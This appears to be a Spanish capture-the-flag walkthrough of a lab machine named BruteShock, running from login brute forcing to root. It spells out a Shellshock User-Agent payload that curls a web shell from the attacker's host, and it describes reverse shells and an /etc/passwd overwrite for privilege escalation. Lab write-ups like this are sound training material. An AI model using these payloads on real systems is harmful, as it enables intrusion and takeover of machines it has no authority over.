# RESOLUCIÓN DE LA MÁQUINA BRUTESHOCK

Abrimos la máquina y vemos su IP.

![image](https://github.com/user-attachments/assets/55505e12-a245-4585-adeb-67d88aaec72b)

Hacemos un nmap para poder ver los puertos que estan abiertos para la IP seleccionada.

![image](https://github.com/user-attachments/assets/c8e3cda1-a5da-4d11-bba5-dea0877176a5)

Ahora hacemos un escaneo de los puertos que hemos visto que estan abiertos para saber servicios,versiones...

![image](https://github.com/user-attachments/assets/25401dc0-d8d5-4c16-acd4-23a80c70e7d7)

Inspeccionamos la página y vemos que hay una cookie de sesión.

![image](https://github.com/user-attachments/assets/da79db33-752d-4be4-961d-5819a4918c83)

Vamos a hacer gobuster indicando esta cookie que tenemos, ya que de normal no nos estaba mostrando resultados.

![image](https://github.com/user-attachments/assets/9a4ccfad-40e2-4fe2-a011-2d85e6a906be)

Encontramos un index.php, que al usarlo nos vuelve a mostrar el mismo panel de login que ya teníamos.

![image](https://github.com/user-attachments/assets/caeb9a7e-be21-450b-89f7-ea8cb8fef46e)

Vamos a hacer fuerza bruta con hydra probando diferentes usuarios básicos, en busca de contraseñas.

Para ello tendremos que recopilar información al inspeccionar el login, ya que hay que hacer un hydra añadiendo la cookie de sesión, la solicitud y la respuesta.

![image](https://github.com/user-attachments/assets/7c82b4c4-68fd-4c48-86b9-6878dfd770bc)

![image](https://github.com/user-attachments/assets/ee79a520-4600-421c-b701-248625482107)

![image](https://github.com/user-attachments/assets/4468a2f4-86a6-46e6-89e9-17f1d9399ae6)

Hacemos hydra para el usuario admin y conseguimos una contraseña.

![image](https://github.com/user-attachments/assets/07bb2590-f5c4-44c7-bf5c-a1f75b41af86)

Nos logueamos.

![image](https://github.com/user-attachments/assets/13dc288a-7541-4fa6-9dfb-fe74e36bc436)

Ahora vemos un login de google.

![image](https://github.com/user-attachments/assets/3d8dfb72-473a-4d1b-bf96-9a11fdf54fd1)

En el vemos "User-Agent almacenado en el log", y nos hace pensar que estamos ante un posible shellshock.

![image](https://github.com/user-attachments/assets/90b5a54e-0582-4a36-8d4b-cb94fa42b8dd)

Para vulnerar esto, abriremos el burpsuite y captaremos la solicitud del login, nos iremos al apartado de "User-Agent" y añadiremos este código.

![image](https://github.com/user-attachments/assets/706d3571-5810-4874-bde1-809851319015)

Y veremos ese mensaje en el login.

![image](https://github.com/user-attachments/assets/9e5cf809-b147-4847-b5e4-0f35ae63fd99)

Vamos a hacer una reverse shell.

![image](https://github.com/user-attachments/assets/49a80486-c306-4270-9c53-d80c30f2ee2b)

![image](https://github.com/user-attachments/assets/9df81163-7ccd-4966-a261-83f00f603a44)

Me desconecta pasados unos segundos.

![image](https://github.com/user-attachments/assets/fa3c898e-e443-473d-b1e3-a578e90b9d12)

Vamos a probar otra forma de hacerlo.

Para ello tendremos que crear un archivo malicioso en nuestra maquina, y desde allí abrirnos un server con python.

![image](https://github.com/user-attachments/assets/12c4e511-82bd-4cee-9935-d0dcb5108ce2)

![image](https://github.com/user-attachments/assets/e0334faa-86ae-43cc-b7b6-955909042ae1)

Ahora desde burpsuite, desde el User-Agent ejecutamos esto: () { :; }; curl 192.168.1.102:8000/shell.php -o shell.php

De esta manera cogeremos el archivo maliciosos que hemos creado y poder abrirlo desde la web y ejecutar comandos con el parámetro cmd.

![image](https://github.com/user-attachments/assets/c2b913d1-705b-4088-81d3-9171b49ad678)

Vamos a hacer de nuevo una reverse shell, pero al cabo de unos segundos nos vuelve a sacar.

![image](https://github.com/user-attachments/assets/ed59d27f-165f-4f47-827e-2df4845bb33c)

Después de un buen rato probando cosas, sin usamos la reverse shell, pero en base64, si nos deja.

![image](https://github.com/user-attachments/assets/0eaeea24-2539-4b43-a895-ccf5b83d72e8)

Para ello hay que usar esta reverse shell pero añadiendo "base64 -d", para decodearla y bash para que nos de una bash.

![image](https://github.com/user-attachments/assets/3a810faf-11e9-4e9e-a08a-eb0ea1c2cad5)

Y de esta manera si ganamos acceso a la máquina víctima y no nos saca.

![image](https://github.com/user-attachments/assets/225afbe9-cd87-4393-ab85-2fd55768aa2c)

En el directorio /home tenemos 3 usuarios.

![image](https://github.com/user-attachments/assets/219e846b-cb69-4c05-b4a2-bc74256da5cd)

Hemos usado el comando find para cada uno de ellos, y en el usuario darksblack hemos encontrado este hash: 

![image](https://github.com/user-attachments/assets/87c09a17-158b-4ae9-ab1c-91ded619594d)

Nos lo pasamos a nuestra máquina y usando john sacamos unas credenciales.

![image](https://github.com/user-attachments/assets/72070281-2f03-4220-8915-4c1f948227a1)

Nos conectamos como darksblack.

![image](https://github.com/user-attachments/assets/9b76b547-fafe-474e-8963-4b40fadddd05)

Hacemos sudo -l y vemos esto: 

![image](https://github.com/user-attachments/assets/e16c48cb-f967-41e2-9abb-4820d34ab4c3)

Miramos el archivo script.sh

![image](https://github.com/user-attachments/assets/bc40b3a6-5d57-42ad-bc9c-cfad86e8c6ea)

Nos vamos a esta página: https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/bash-eq-privilege-escalation/

![image](https://github.com/user-attachments/assets/9ed2b39e-080e-4161-8818-839937148b3f)

Y ejecutamos este comando cuando nos pida el número, y de esta manera nos convertimos en maci.

![image](https://github.com/user-attachments/assets/612702d4-01f5-4bf0-8fa0-74d30b1d4261)

INFORMACIÓN MACI CREADOR MÁQUINA

![image](https://github.com/user-attachments/assets/2685bf0b-dcec-4fc2-9ac2-0a57d75eff29)

![image](https://github.com/user-attachments/assets/2b82e63b-8d48-425d-8535-972b7f1f456f)

Aun así no puedo obtener la bash, tenemos que crear un script en python que me envie una reverse shell.

![image](https://github.com/user-attachments/assets/999a186d-0338-4e3b-9548-4ab7dc2a62db)

Le damos permisos y lo ejecutamos.

![image](https://github.com/user-attachments/assets/7ad4f5f4-f470-4809-b9d7-574c83c6a109)

Para ello tenemos que estar en escucha desde nuestra máquina atacante, y de esta manera ya somos pepe.

![image](https://github.com/user-attachments/assets/dfea68f3-62d1-4890-a1f7-a4a7d14eb4c7)

Volvemos a hacer sudo -l y ahora vemos esto: 

![image](https://github.com/user-attachments/assets/491bfa01-91e0-452b-8665-3c605fcce2b9)

Buscamos en el GTFObins y solo vemos esto: 

![image](https://github.com/user-attachments/assets/4d27004c-0b99-458d-880a-af511c98422e)

Vamos a copiarnos el /etc/passwd a otro archivo y le vamos a quitar la "x" del root.

![image](https://github.com/user-attachments/assets/0d73d42f-ba4a-471a-8723-4ee32138faa5)

Ahora ejecutamos el permiso SUDO seguido de estos dos archivos, para convertir el archivo que hemos creado, en el ya existente "/etc/passwd"

![image](https://github.com/user-attachments/assets/223c3ba4-ddbc-4336-8ed3-bb4e67185ccd)

Y ya somos root.

![image](https://github.com/user-attachments/assets/0d68dc32-4f99-4096-8102-6a37188ed542)




